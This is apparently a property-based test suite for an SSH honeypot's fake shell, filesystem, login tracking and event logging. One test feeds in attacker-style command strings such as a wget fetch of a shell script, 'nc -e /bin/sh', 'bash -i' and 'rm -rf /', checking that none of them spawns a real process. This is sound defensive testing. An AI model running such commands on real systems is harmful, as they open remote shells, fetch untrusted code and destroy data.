"""All trap-core property-based tests, grouped by design property number.

Feature: trap-core
"""

from __future__ import annotations

import asyncio
import dataclasses
import json
import os
import socket
import subprocess
import tempfile
from collections.abc import Callable, Iterator
from contextlib import ExitStack, contextmanager
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, cast
from unittest import mock
from unittest.mock import patch

import pytest
from hypothesis import HealthCheck, given, settings
from hypothesis import strategies as st

from tests.test_unit_dispatcher import RecordingLLM, make_ctx
from trap.auth.credentials import parse_credentials, serialise_credentials
from trap.auth.tracker import MAX_TRACKED_IPS, AttemptTracker
from trap.config import Config, load_config
from trap.ghost.commands.download import curl, wget
from trap.ghost.commands.exit_ import SessionExitRequested
from trap.ghost.commands.info import echo
from trap.ghost.dispatcher import CommandResult, Dispatcher, build_default_dispatcher
from trap.ghost.filesystem import FakeFilesystem, FakeNode, load_template
from trap.ghost.llm import LLMInterface, LLMReply, ScriptedFallback
from trap.ghost.logger import EventLogger
from trap.ghost.shell import LINE_TOO_LONG, build_prompt, run_shell
from trap.models import Event, Session, SessionContext
from trap.server import TrapServer, _Shared

# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

_TEMPLATE_PATH = Path(__file__).resolve().parent.parent / "trap" / "ghost" / "fs_template.yaml"
_TEMPLATE = load_template(_TEMPLATE_PATH)
_BASE = Path("trap-test-unused")


def _config(
    tmp: Path, accept_after: int | None = None, max_input_line: int = 4096
) -> Config:
    return Config(
        trap_port=2222,
        host_key_path=tmp / "host_key",
        credential_file=tmp / "creds.txt",
        log_dir=tmp / "logs",
        idle_timeout_seconds=300,
        max_session_seconds=1800,
        max_input_line=max_input_line,
        accept_after_attempts=accept_after,
        llm_backend="scripted",
        llm_api_url=None,
    )


def _session(username: str = "root") -> Session:
    return Session(
        session_id="abc",
        src_ip="203.0.113.7",
        src_port=40000,
        username=username,
        password="x",
        client_version="SSH-2.0-test",
        started_at=datetime.now(UTC),
    )


def _bare_ctx(username: str = "root") -> SessionContext:
    """Context without a filesystem or config, for handlers that need neither."""
    return SessionContext(
        session=_session(username), fs=cast(Any, None), history=[], config=cast(Any, None)
    )


# ---------------------------------------------------------------------------
# Property 1 / 2 / 15 / 16 / 17 / 23 helpers (dispatcher)
# ---------------------------------------------------------------------------

_SAFE = ["pwd", "whoami", "hostname"]
_OUT = {"pwd": "/", "whoami": "root", "hostname": "records-srv-09"}


def _dispatch_run(
    raw: str, dispatcher: Dispatcher | None = None
) -> tuple[str | None, SessionContext]:
    ctx = make_ctx(_BASE)
    d = dispatcher or build_default_dispatcher(RecordingLLM())
    try:
        return asyncio.run(d.dispatch(raw, ctx)), ctx
    except SessionExitRequested:
        return None, ctx  # documented: exit propagates to the shell


@contextmanager
def _forbidden_calls() -> Iterator[list[str]]:
    """Patch every process-spawning API with a recorder; yields the call log."""
    calls: list[str] = []

    def spy(name: str) -> Callable[..., Any]:
        def _f(*_a: Any, **_k: Any) -> Any:
            calls.append(name)
            raise OSError(f"forbidden call: {name}")

        return _f

    targets = [
        (subprocess, n)
        for n in ("Popen", "run", "call", "check_call", "check_output", "getoutput",
                  "getstatusoutput")
    ]
    targets += [(os, "system"), (os, "popen")]
    try:  # pty is unavailable on Windows
        import pty

        targets += [(pty, "spawn"), (pty, "fork")]
    except ImportError:
        pass
    targets += [
        (os, n)
        for n in dir(os)
        if n.startswith(("exec", "spawn")) or n in ("fork", "forkpty", "posix_spawn",
                                                     "posix_spawnp", "startfile")
    ]
    with ExitStack() as stack:
        for mod, attr in targets:
            if hasattr(mod, attr):
                stack.enter_context(mock.patch.object(mod, attr, spy(f"{mod.__name__}.{attr}")))
        yield calls


# Feature: trap-core, Property 1: Ghost Shell robustness — arbitrary input never raises
# **Validates: Requirements 10.4, 11.1**
@settings(max_examples=100, deadline=None)
@given(raw=st.text(max_size=4096))
def test_property_1_arbitrary_input_never_raises(raw: str) -> None:
    result, _ = _dispatch_run(raw)
    assert result is None or isinstance(result, str)


# Feature: trap-core, Property 2: No-execution invariant — forbidden APIs never invoked
# **Validates: Requirements 10.1, 11.4, 8.5**
@settings(max_examples=100, deadline=None)
@given(raw=st.text(max_size=4096))
def test_property_2_no_forbidden_apis_invoked(raw: str) -> None:
    with _forbidden_calls() as calls:
        _dispatch_run(raw)
    assert calls == []


# Feature: trap-core, Property 2: No-execution invariant (realistic attacker payloads)
# **Validates: Requirements 10.1, 11.4, 8.5**
@settings(max_examples=100, deadline=None)
@given(
    cmd=st.sampled_from(
        ["wget http://x.test/a.sh", "curl http://x.test/b", "./a.sh", "/bin/sh -c id",
         "rm -rf /", "sh", "bash -i", "python -c 'import os'", "$(id)", "`id`", "nc -e /bin/sh"]
    ),
    suffix=st.text(max_size=50),
)
def test_property_2_attacker_style_payloads(cmd: str, suffix: str) -> None:
    with _forbidden_calls() as calls:
        _dispatch_run(f"{cmd} {suffix}; {cmd} | {cmd} && {cmd}")
    assert calls == []


# Feature: trap-core, Property 3: Filesystem isolation — sessions are independent
# **Validates: Requirements 4.5**
def _collect(node: FakeNode, prefix: str, dirs: list[str], files: list[str]) -> None:
    for name, child in (node.children or {}).items():
        path = f"{prefix}/{name}"
        if child.is_dir:
            dirs.append(path)
            _collect(child, path, dirs, files)
        else:
            files.append(path)


def _fs_paths() -> tuple[list[str], list[str]]:
    dirs: list[str] = ["/"]
    files: list[str] = []
    _collect(_TEMPLATE, "", dirs, files)
    return dirs, files


_DIRS, _FILES = _fs_paths()

_new_name = st.from_regex(r"zz[a-z0-9_]{1,12}", fullmatch=True)
_dir_path = st.sampled_from(_DIRS)
_file_path = st.sampled_from(_FILES)


def _join(directory: str, name: str) -> str:
    return directory.rstrip("/") + "/" + name


def _snapshot(node: FakeNode) -> object:
    children = None
    if node.children is not None:
        children = tuple((k, _snapshot(v)) for k, v in sorted(node.children.items()))
    return (
        node.name,
        node.is_dir,
        node.content,
        node.permissions,
        node.owner,
        node.size,
        node.mtime,
        children,
    )


def _fs_snapshot(fs: FakeFilesystem) -> object:
    root = fs.resolve("/")
    assert root is not None
    return (_snapshot(root), fs.cwd_path())


_mutation = st.one_of(
    st.tuples(st.just("mkdir"), _dir_path, _new_name),
    st.tuples(st.just("touch"), _dir_path, _new_name),
    st.tuples(st.just("create_file"), _dir_path, _new_name),
    st.tuples(st.just("rm"), _file_path, st.just("")),
    st.tuples(st.just("chmod"), _file_path, st.just("")),
    st.tuples(st.just("cd"), _dir_path, st.just("")),
)


@settings(max_examples=100)
@given(ops=st.lists(_mutation, max_size=15))
def test_property_3_sessions_are_isolated(ops: list[tuple[str, str, str]]) -> None:
    first = FakeFilesystem(_TEMPLATE)
    second = FakeFilesystem(_TEMPLATE)
    before = _fs_snapshot(second)
    for op, path, name in ops:
        try:
            if op == "mkdir":
                first.mkdir(_join(path, name))
            elif op == "touch":
                first.touch(_join(path, name))
            elif op == "create_file":
                first.create_file(_join(path, name), "data")
            elif op == "rm":
                first.rm(path, recursive=True)
            elif op == "chmod":
                first.chmod(path, "777")
            else:
                first.cd(path)
        except (OSError, ValueError):
            pass
    assert _fs_snapshot(second) == before


# ---------------------------------------------------------------------------
# Properties 4 / 5 / 20 (server half) helpers
# ---------------------------------------------------------------------------

_usernames = st.text(min_size=1, max_size=32)
_passwords = st.text(min_size=1, max_size=64)
_pairs = st.tuples(_usernames, _passwords)


def _shared(
    tmp: Path, creds: frozenset[tuple[str, str]], accept_after: int | None
) -> _Shared:
    root = FakeNode("", True, "", "drwxr-xr-x", "root", 0, "Jan  1  2009", {})
    return _Shared(
        config=_config(tmp, accept_after),
        creds=creds,
        tracker=AttemptTracker(max_attempts_per_ip=(accept_after or 100) + 1),
        template=root,
        shell_handler=None,
        llm=ScriptedFallback(),
    )


async def _attempt(
    shared: _Shared, ip: str, port: int, username: str, password: str
) -> tuple[bool, Path]:
    """Run one password attempt on a fresh TrapServer; return (accepted, log path)."""
    server = TrapServer(shared)
    server._src_ip = ip
    server._src_port = port
    server._open_task = asyncio.ensure_future(server._open_logger_and_start())
    accepted = await server.password_auth_requested(username, password)
    assert server._logger is not None
    path = server._logger.path
    await server._logger.close()
    return accepted, path


def _read_events(path: Path) -> list[dict[str, object]]:
    text = path.read_text(encoding="utf-8")
    return [json.loads(line) for line in text.split("\n") if line]


# Feature: trap-core, Property 4: Credential authentication round-trip
# **Validates: Requirements 2.1, 2.2**
@settings(max_examples=100, deadline=None)
@given(
    listed=st.lists(_pairs, max_size=10),
    probes=st.lists(_pairs, min_size=1, max_size=5),
)
def test_property_4_credential_round_trip(
    listed: list[tuple[str, str]], probes: list[tuple[str, str]]
) -> None:
    creds = frozenset(listed)
    with tempfile.TemporaryDirectory() as d:
        shared = _shared(Path(d), creds, None)

        async def run() -> None:
            for pair in [*listed, *probes]:
                accepted, _ = await _attempt(shared, "203.0.113.9", 40000, *pair)
                assert accepted == (pair in creds)

        asyncio.run(run())


# Feature: trap-core, Property 5: Login attempt event completeness
# **Validates: Requirements 2.3**
@settings(max_examples=100, deadline=None)
@given(
    ip=st.ip_addresses(v=4).map(str),
    port=st.integers(1024, 65535),
    username=_usernames,
    password=st.text(max_size=64),
    listed=st.booleans(),
)
def test_property_5_login_attempt_event_complete(
    ip: str, port: int, username: str, password: str, listed: bool
) -> None:
    creds = frozenset({(username, password)}) if listed else frozenset()
    with tempfile.TemporaryDirectory() as d:
        shared = _shared(Path(d), creds, None)
        accepted, path = asyncio.run(_attempt(shared, ip, port, username, password))
        events = [e for e in _read_events(path) if e["kind"] == "login_attempt"]
        assert len(events) == 1
        event = events[0]
        assert event["session_id"] == path.stem
        assert event["timestamp"]
        payload = event["payload"]
        assert isinstance(payload, dict)
        assert payload["src_ip"] == ip
        assert payload["src_port"] == port
        assert payload["username"] == username
        assert payload["password"] == password
        assert "client_version" in payload
        assert payload["success"] is accepted
        assert accepted is listed


# Feature: trap-core, Property 6: Credential list parse round-trip
# **Validates: Requirements 1.4**
_CRED_CHARS = st.characters(blacklist_categories=("Cs", "Cc"))
_CRED_USERNAMES = st.text(
    _CRED_CHARS.filter(lambda c: c != ":"), min_size=1, max_size=32
).filter(lambda s: not s.startswith("#"))
_CRED_PASSWORDS = st.text(_CRED_CHARS, min_size=1, max_size=64)


@settings(max_examples=100)
@given(st.lists(st.tuples(_CRED_USERNAMES, _CRED_PASSWORDS)))
def test_property_6_credential_file_parse_roundtrip(pairs: list[tuple[str, str]]) -> None:
    assert parse_credentials(serialise_credentials(pairs)) == pairs


# ---------------------------------------------------------------------------
# Property 7 helpers (config)
# ---------------------------------------------------------------------------

# Paths are never touched: every case below fails validation before any
# directory is created.
_VALID_PATHS = {
    "TRAP_HOST_KEY_PATH": str(Path("unused") / "keys" / "host_key"),
    "TRAP_CREDENTIAL_FILE": str(Path("unused") / "creds.txt"),
    "TRAP_LOG_DIR": str(Path("unused") / "logs"),
}


def _is_valid_port(raw: str) -> bool:
    try:
        return 1 <= int(raw.strip()) <= 65535
    except ValueError:
        return False


def _is_positive_int(raw: str) -> bool:
    try:
        return int(raw.strip()) > 0
    except ValueError:
        return False


def _assert_exits_with_1(env: dict[str, str]) -> None:
    with mock.patch.object(os, "environ", env):
        with pytest.raises(SystemExit) as exc:
            load_config()
    assert exc.value.code == 1


_invalid_ports = st.one_of(
    st.text().filter(lambda s: not _is_valid_port(s)),
    st.integers(max_value=0).map(str),
    st.integers(min_value=65536).map(str),
)

_invalid_positive_ints = st.one_of(
    st.text().filter(lambda s: not _is_positive_int(s)),
    st.integers(max_value=0).map(str),
)

_blank_paths = st.text(alphabet=" \t\n", max_size=5)


# Feature: trap-core, Property 7: Config validation rejects invalid values
# **Validates: Requirements 1.6**
@settings(max_examples=100)
@given(port=_invalid_ports)
def test_property_7_invalid_port_exits(port: str) -> None:
    _assert_exits_with_1({**_VALID_PATHS, "TRAP_PORT": port})


@settings(max_examples=100)
@given(
    name=st.sampled_from(["TRAP_HOST_KEY_PATH", "TRAP_CREDENTIAL_FILE", "TRAP_LOG_DIR"]),
    value=_blank_paths,
)
def test_property_7_blank_required_path_exits(name: str, value: str) -> None:
    _assert_exits_with_1({**_VALID_PATHS, name: value})


@settings(max_examples=100)
@given(
    name=st.sampled_from(
        [
            "TRAP_IDLE_TIMEOUT_SECONDS",
            "TRAP_MAX_SESSION_SECONDS",
            "TRAP_ACCEPT_AFTER_ATTEMPTS",
        ]
    ),
    value=_invalid_positive_ints,
)
def test_property_7_invalid_positive_int_exits(name: str, value: str) -> None:
    # An all-whitespace TRAP_ACCEPT_AFTER_ATTEMPTS means "unset", which is valid.
    if name == "TRAP_ACCEPT_AFTER_ATTEMPTS" and not value.strip():
        return
    _assert_exits_with_1({**_VALID_PATHS, name: value})


# Feature: trap-core, Property 8: mkdir → ls round-trip
# **Validates: Requirements 5.10, 11.2**
@settings(max_examples=100)
@given(directory=_dir_path, name=_new_name)
def test_property_8_mkdir_then_ls_contains_name(directory: str, name: str) -> None:
    fs = FakeFilesystem(_TEMPLATE)
    fs.mkdir(_join(directory, name))
    listed = {node.name for node in fs.ls(directory)}
    assert name in listed


# Feature: trap-core, Property 9: rm → cat round-trip
# **Validates: Requirements 5.12, 11.3**
@settings(max_examples=100)
@given(path=_file_path)
def test_property_9_rm_then_cat_errors(path: str) -> None:
    fs = FakeFilesystem(_TEMPLATE)
    previous = fs.cat(path)
    fs.rm(path)
    with pytest.raises(OSError):
        fs.cat(path)
    node = fs.resolve(path)
    assert node is None or node.content != previous or previous == ""


# Feature: trap-core, Property 10: Filesystem command correctness — pwd, cd, cat, touch, chmod
# **Validates: Requirements 5.1, 5.2, 5.4, 5.11, 5.14**
@settings(max_examples=100)
@given(path=_dir_path)
def test_property_10_cd_changes_cwd_to_existing_dir(path: str) -> None:
    fs = FakeFilesystem(_TEMPLATE)
    fs.cd(path)
    assert fs.cwd_path() == (path if path == "/" else path.rstrip("/"))


@settings(max_examples=100)
@given(path=_dir_path, name=_new_name)
def test_property_10_cd_missing_keeps_cwd(path: str, name: str) -> None:
    fs = FakeFilesystem(_TEMPLATE)
    fs.cd(path)
    before = fs.cwd_path()
    with pytest.raises(OSError):
        fs.cd(_join(path, name))
    assert fs.cwd_path() == before


@settings(max_examples=100)
@given(path=_file_path)
def test_property_10_cat_returns_exact_content(path: str) -> None:
    fs = FakeFilesystem(_TEMPLATE)
    node = fs.resolve(path)
    assert node is not None
    assert fs.cat(path) == node.content


@settings(max_examples=100)
@given(directory=_dir_path, name=_new_name)
def test_property_10_touch_creates_empty_file(directory: str, name: str) -> None:
    fs = FakeFilesystem(_TEMPLATE)
    path = _join(directory, name)
    fs.touch(path)
    assert fs.cat(path) == ""


@settings(max_examples=100)
@given(
    path=_file_path,
    mode=st.integers(min_value=0, max_value=0o777).map(lambda m: format(m, "03o")),
)
def test_property_10_chmod_reflected_in_ls(path: str, mode: str) -> None:
    fs = FakeFilesystem(_TEMPLATE)
    fs.chmod(path, mode)
    bits = int(mode, 8)
    expected = "-" + "".join(
        ("r" if bits >> s & 4 else "-")
        + ("w" if bits >> s & 2 else "-")
        + ("x" if bits >> s & 1 else "-")
        for s in (6, 3, 0)
    )
    listed = fs.ls(path)
    assert len(listed) == 1
    assert listed[0].permissions == expected


# ---------------------------------------------------------------------------
# Property 11 helpers (prompt)
# ---------------------------------------------------------------------------

_prompt_usernames = st.one_of(
    st.just("root"),
    st.text(
        alphabet=st.characters(whitelist_categories=("L", "N"), max_codepoint=127),
        min_size=1,
        max_size=32,
    ),
)
_components = st.text(
    alphabet=st.characters(whitelist_categories=("L", "N"), max_codepoint=127),
    min_size=1,
    max_size=16,
)


def _expected_prompt(username: str, cwd: str) -> str:
    home = "/root" if username == "root" else f"/home/{username}"
    if cwd == home:
        display = "~"
    elif cwd == "/":
        display = "/"
    else:
        display = cwd.rstrip("/").split("/")[-1]
    sigil = "#" if username == "root" else "$"
    return f"[{username}@records-srv-09 {display}]{sigil}"


def test_prompt_basename_examples() -> None:
    assert build_prompt("root", "/tmp") == "[root@records-srv-09 tmp]# "
    assert build_prompt("root", "/root") == "[root@records-srv-09 ~]# "
    assert build_prompt("root", "/") == "[root@records-srv-09 /]# "
    assert build_prompt("bob", "/home/bob/a/b") == "[bob@records-srv-09 b]$ "


# Feature: trap-core, Property 11: Prompt format correctness
# **Validates: Requirements 4.3** (ghost-llm: 6.4, 9.9 — basename display)
@settings(max_examples=100)
@given(
    username=_prompt_usernames,
    parts=st.lists(_components, max_size=5),
    under_home=st.booleans(),
)
def test_property_11_prompt_format(username: str, parts: list[str], under_home: bool) -> None:
    home = "/root" if username == "root" else f"/home/{username}"
    base = home if under_home else ""
    cwd = (base + "/" + "/".join(parts)) if parts else (base or "/")
    prompt = build_prompt(username, cwd)
    assert prompt.rstrip() == _expected_prompt(username, cwd)


# Feature: trap-core, Property 12: echo is identity on its arguments
# **Validates: Requirements 5.9**
@settings(max_examples=100)
@given(args=st.lists(st.text(max_size=128), max_size=20))
def test_property_12_echo_identity(args: list[str]) -> None:
    result = asyncio.run(echo(list(args), _bare_ctx()))
    assert result.output == " ".join(args)
    assert result.is_error is False


# Feature: trap-core, Property 13: ScriptedFallback command-not-found format
# **Validates: Requirements 7.3**
_commands = st.text(max_size=200).filter(lambda s: bool(s.split()))


@settings(max_examples=100)
@given(command=_commands)
def test_property_13_scripted_fallback_format(command: str) -> None:
    result = asyncio.run(ScriptedFallback().respond(_bare_ctx(), command))
    assert result.text == f"bash: {command.split()[0]}: command not found"
    assert result.source == "scripted"


# Feature: trap-core, Property 14: LLM exception fallback — session stays open
# **Validates: Requirements 7.5**
_exceptions = st.sampled_from(
    [
        RuntimeError("boom"),
        ValueError("bad"),
        OSError("io"),
        TimeoutError("slow"),
        KeyError("k"),
        ConnectionError("down"),
        Exception("generic"),
    ]
)

# Plain alphanumeric names that are never registered in the dispatcher.
_cmd_names = st.from_regex(r"zz[a-z0-9]{1,10}", fullmatch=True)


@settings(max_examples=100)
@given(exc=_exceptions, name=_cmd_names)
def test_property_14_llm_exception_fallback(exc: Exception, name: str) -> None:
    class _Raising(LLMInterface):
        async def respond(self, session_context: SessionContext, command: str) -> LLMReply:
            raise exc

    dispatcher = Dispatcher(_Raising())
    ctx = _bare_ctx()

    async def run() -> tuple[str, str]:
        first = await dispatcher.dispatch(name, ctx)
        # Dispatcher remains usable afterwards (session stays open).
        second = await dispatcher.dispatch(name, ctx)
        return first, second

    first, second = asyncio.run(run())
    expected = f"bash: {name}: command not found"
    assert first.strip() == expected
    assert second.strip() == expected


# Feature: trap-core, Property 15: Semicolon chain — all tokens execute
# **Validates: Requirements 8.1**
@settings(max_examples=100, deadline=None)
@given(cmds=st.lists(st.sampled_from(_SAFE), min_size=2, max_size=5))
def test_property_15_semicolon_chain_runs_all(cmds: list[str]) -> None:
    result, _ = _dispatch_run("; ".join(cmds))
    assert result == "\n".join(_OUT[c] for c in cmds)


# Feature: trap-core, Property 16: && operator — right executes only on left success
# **Validates: Requirements 8.2**
@settings(max_examples=100, deadline=None)
@given(left=st.sampled_from(_SAFE), right=st.sampled_from(_SAFE), fail=st.booleans())
def test_property_16_and_operator(left: str, right: str, fail: bool) -> None:
    if fail:
        result, _ = _dispatch_run(f"cat /no/such/file && {right}")
        assert result is not None
        assert "No such file" in result
        assert _OUT[right] not in result.splitlines()
    else:
        result, _ = _dispatch_run(f"{left} && {right}")
        assert result == f"{_OUT[left]}\n{_OUT[right]}"


# Feature: trap-core, Property 17: Chain exception isolation
# **Validates: Requirements 8.4**
@settings(max_examples=100, deadline=None)
@given(
    cmds=st.lists(st.sampled_from([*_SAFE, "broken"]), min_size=2, max_size=6).filter(
        lambda c: "broken" in c
    )
)
def test_property_17_exception_isolation(cmds: list[str]) -> None:
    async def broken(args: list[str], c: SessionContext) -> CommandResult:
        raise ValueError("kaboom")

    d = build_default_dispatcher(RecordingLLM())
    d.register("broken", broken)
    result, _ = _dispatch_run("; ".join(cmds), d)
    assert result == "\n".join(_OUT[c] for c in cmds if c != "broken")


# Feature: trap-core, Property 18: Session_Log validity — JSON Lines round-trip
# **Validates: Requirements 9.2, 11.5, 11.6**
_REQUIRED = {"session_id", "timestamp", "kind", "payload", "generated_by"}


async def _write_and_read(commands: list[str], log_dir: Path) -> tuple[list[Event], list[str]]:
    events = [
        Event(
            session_id="sess1",
            timestamp=f"2024-01-15T10:23:{i % 60:02d}.000000Z",
            kind="command",
            payload={"command": cmd},
            generated_by="scripted",
        )
        for i, cmd in enumerate(commands)
    ]
    async with EventLogger("sess1", log_dir) as lg:
        for ev in events:
            await lg.write(ev)
    raw = (log_dir / "sess1.jsonl").read_bytes().decode("utf-8")
    # Split on "\n" only: str.splitlines() also splits on U+2028 etc., which
    # json.dumps(ensure_ascii=False) leaves unescaped inside strings.
    return events, raw.split("\n")


@settings(max_examples=100, deadline=None)
@given(commands=st.lists(st.text(max_size=256), min_size=1, max_size=20))
def test_property_18_session_log_json_lines_round_trip(commands: list[str]) -> None:
    with tempfile.TemporaryDirectory() as d:
        events, lines = asyncio.run(_write_and_read(commands, Path(d)))

    assert lines[-1] == ""  # file ends with a newline
    lines = lines[:-1]
    assert len(lines) == len(events)
    for ev, line in zip(events, lines, strict=True):
        obj = json.loads(line)
        assert isinstance(obj, dict)
        assert _REQUIRED <= obj.keys()
        assert obj == dataclasses.asdict(ev)
        assert Event(**obj) == ev


# ---------------------------------------------------------------------------
# Property 19 helpers (download)
# ---------------------------------------------------------------------------

_urls = st.from_regex(
    r"https?://[a-z0-9./\-]+\.[a-z]{2,}/[a-z0-9.\-]+", fullmatch=True
).filter(lambda u: len(u) < 300)


def _download_ctx() -> SessionContext:
    session = Session(
        session_id="abc123",
        src_ip="203.0.113.5",
        src_port=40000,
        username="root",
        password="pw",
        client_version="SSH-2.0-test",
        started_at=datetime.now(UTC),
    )
    return SessionContext(
        session=session, fs=FakeFilesystem(_TEMPLATE), history=[], config=_config(_BASE)
    )


def _network_forbidden(*_args: Any, **_kwargs: Any) -> Any:
    raise AssertionError("network access attempted")


def _expected_name(url: str) -> str:
    segment = url.split("?", 1)[0].rstrip("/").rsplit("/", 1)[-1]
    if segment in ("", ".", ".."):
        segment = "index.html"
    return segment[:128]


async def _download_run(tool: str, url: str, ctx: SessionContext) -> str:
    handler = wget if tool == "wget" else curl
    args = [url] if tool == "wget" else ["-o", _expected_name(url), url]
    with (
        patch.object(socket, "socket", _network_forbidden),
        patch.object(socket, "create_connection", _network_forbidden),
        patch.object(socket, "getaddrinfo", _network_forbidden),
    ):
        result = await handler(args, ctx)
    assert not result.is_error
    return result.output


# Feature: trap-core, Property 19: Download simulation — no real network, fake file created
# **Validates: Requirements 6.1, 6.2, 6.3, 6.4, 6.6**
@settings(max_examples=100, deadline=None)
@given(url=_urls, tool=st.sampled_from(["wget", "curl"]))
def test_property_19_download_simulation(url: str, tool: str) -> None:
    ctx = _download_ctx()
    output = asyncio.run(_download_run(tool, url, ctx))

    assert output.strip() != ""

    events = [e for e in ctx.pending_events if e.kind == "download_attempt"]
    assert len(events) == 1
    assert events[0].payload["url"] == url
    assert events[0].payload["command"].startswith(tool)
    assert url in events[0].payload["command"]

    name = _expected_name(url)
    node = ctx.fs.resolve(name)
    assert node is not None
    assert not node.is_dir
    assert name in ctx.downloaded_files


# Feature: trap-core, Property 20: Attempt-counter threshold acceptance
# **Validates: Requirements 2.7**
_ips = st.ip_addresses().map(str)


@given(ip=_ips, n=st.integers(min_value=1, max_value=10))
@settings(max_examples=100)
def test_property_20_tracker_threshold_acceptance(ip: str, n: int) -> None:
    """After N attempts the tracker reports the threshold as met; before N it does not."""
    tracker = AttemptTracker(max_attempts_per_ip=n + 1)
    for i in range(n):
        assert not tracker.should_accept(ip, n), f"accepted early after {i} attempts"
        tracker.record_attempt(ip)
    assert tracker.should_accept(ip, n)
    # Extra attempts keep it accepted.
    tracker.record_attempt(ip)
    assert tracker.should_accept(ip, n)


@settings(max_examples=100, deadline=None)
@given(
    ip=st.ip_addresses(v=4).map(str),
    n=st.integers(min_value=1, max_value=8),
    extra=st.integers(min_value=0, max_value=3),
    password=_passwords,
)
def test_property_20_server_accepts_after_n_attempts(
    ip: str, n: int, extra: int, password: str
) -> None:
    creds = frozenset({("root", "\x00-never-guessed")})
    with tempfile.TemporaryDirectory() as d:
        shared = _shared(Path(d), creds, n)

        async def run() -> None:
            for i in range(1, n + extra + 1):
                accepted, _ = await _attempt(shared, ip, 40000 + i, "nobody", password)
                # Attempt i is counted before the check, so the Nth one is accepted.
                assert accepted == (i >= n)

        asyncio.run(run())


# Feature: trap-core, Property 21: Oversized input — discarded, session stays open
# **Validates: Requirements 3.5**
class _Stdin:
    def __init__(self, lines: list[str]) -> None:
        self._lines = list(lines)

    async def readline(self) -> str:
        return self._lines.pop(0) if self._lines else ""


class _Stdout:
    def __init__(self) -> None:
        self.chunks: list[str] = []

    def write(self, data: str) -> None:
        self.chunks.append(data)

    @property
    def text(self) -> str:
        return "".join(self.chunks)


class _Process:
    def __init__(self, lines: list[str]) -> None:
        self.stdin = _Stdin(lines)
        self.stdout = _Stdout()


_MAX_LINE = 4096
_line_chars = st.characters(blacklist_categories=("Cs", "Cc"), blacklist_characters="\r\n")
_oversized_lines = st.integers(min_value=_MAX_LINE + 1, max_value=_MAX_LINE + 3000).flatmap(
    lambda n: st.text(alphabet=_line_chars, min_size=1, max_size=3).map(
        lambda s: (s * (n // len(s) + 1))[:n]
    )
)


async def _shell_run(lines: list[str], tmp: Path) -> tuple[str, list[dict[str, Any]]]:
    config = _config(tmp, max_input_line=_MAX_LINE)
    session = Session(
        session_id="oversize1",
        src_ip="203.0.113.5",
        src_port=40000,
        username="root",
        password="pw",
        client_version="SSH-2.0-test",
        started_at=datetime.now(UTC),
    )
    fs = FakeFilesystem(_TEMPLATE)
    dispatcher = build_default_dispatcher(ScriptedFallback())
    process = _Process([ln + "\n" for ln in lines])
    async with EventLogger(session.session_id, config.log_dir) as logger:
        await run_shell(cast(Any, process), config, session, fs, dispatcher, logger)
        path = logger.path
    events = [json.loads(x) for x in path.read_text(encoding="utf-8").splitlines()]
    return process.stdout.text, events


@settings(max_examples=100, deadline=None)
@given(big=st.lists(_oversized_lines, min_size=1, max_size=3))
def test_property_21_oversized_lines_discarded_and_session_continues(big: list[str]) -> None:
    with tempfile.TemporaryDirectory() as d:
        out, events = asyncio.run(_shell_run([*big, "whoami"], Path(d)))

    assert out.count(LINE_TOO_LONG) == len(big)
    commands = [e["payload"]["command"] for e in events if e["kind"] == "command"]
    assert commands == ["whoami"]
    for e in events:
        assert not any(b in json.dumps(e["payload"]) for b in big)
    # Session stayed open: the following command was answered, ended by EOF.
    assert "root\n" in out.replace(LINE_TOO_LONG, "")
    end = [e for e in events if e["kind"] == "session_end"]
    assert len(end) == 1 and end[0]["payload"]["reason"] == "disconnect"


def test_property_21_line_at_limit_is_processed() -> None:
    line = "a" * _MAX_LINE
    with tempfile.TemporaryDirectory() as d:
        out, events = asyncio.run(_shell_run([line], Path(d)))
    assert LINE_TOO_LONG not in out
    assert [e["kind"] for e in events].count("command") == 1


# Feature: trap-core, Property 22: AttemptTracker memory is bounded
# **Validates: Requirements 2.7**
@given(seq=st.lists(_ips, min_size=1, max_size=12_000))
@settings(
    max_examples=100,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow, HealthCheck.data_too_large],
)
def test_property_22_memory_bounded(seq: list[str]) -> None:
    max_per_ip = 5
    tracker = AttemptTracker(max_attempts_per_ip=max_per_ip)
    for ip in seq:
        tracker.record_attempt(ip)
        assert len(tracker._window) <= MAX_TRACKED_IPS
    for stamps in tracker._window.values():
        assert len(stamps) <= max_per_ip


@given(per_ip=st.integers(min_value=1, max_value=12))
@settings(max_examples=100, deadline=None)
def test_property_22_ip_cap_exceeded(per_ip: int) -> None:
    """Bound holds beyond the IP cap (MAX_TRACKED_IPS + 50 distinct IPs)."""
    max_per_ip = 5
    tracker = AttemptTracker(max_attempts_per_ip=max_per_ip)
    total = MAX_TRACKED_IPS + 50
    for i in range(total):
        ip = f"10.{(i >> 16) & 255}.{(i >> 8) & 255}.{i & 255}"
        for _ in range(per_ip if i % 1000 == 0 else 1):
            tracker.record_attempt(ip)
    assert len(tracker._window) == MAX_TRACKED_IPS
    assert all(len(s) <= max_per_ip for s in tracker._window.values())
    # Oldest IPs were evicted (LRU), newest retained.
    assert "10.0.0.0" not in tracker._window
    last = total - 1
    assert f"10.{(last >> 16) & 255}.{(last >> 8) & 255}.{last & 255}" in tracker._window


# Feature: trap-core, Property 23: Executing a downloaded file returns segfault;
# executing an unknown path returns command-not-found
# **Validates: Requirements 6.5**
_FILENAME = st.from_regex(r"[a-z][a-z0-9_\-]{0,31}\.[a-z]{1,4}", fullmatch=True)


@settings(max_examples=100, deadline=None)
@given(
    name=_FILENAME,
    other=_FILENAME,
    directory=st.sampled_from(["/tmp", "/root", "/var/tmp"]),
)
def test_property_23_downloaded_file_execution(name: str, other: str, directory: str) -> None:
    ctx = make_ctx(_BASE)
    ctx.downloaded_files.add(name)
    d = build_default_dispatcher(RecordingLLM())

    assert asyncio.run(d.dispatch(f"./{name}", ctx)) == "Segmentation fault (core dumped)"
    assert (
        asyncio.run(d.dispatch(f"{directory}/{name}", ctx))
        == "Segmentation fault (core dumped)"
    )

    if other != name:
        assert (
            asyncio.run(d.dispatch(f"./{other}", ctx))
            == f"bash: ./{other}: No such file or directory"
        )
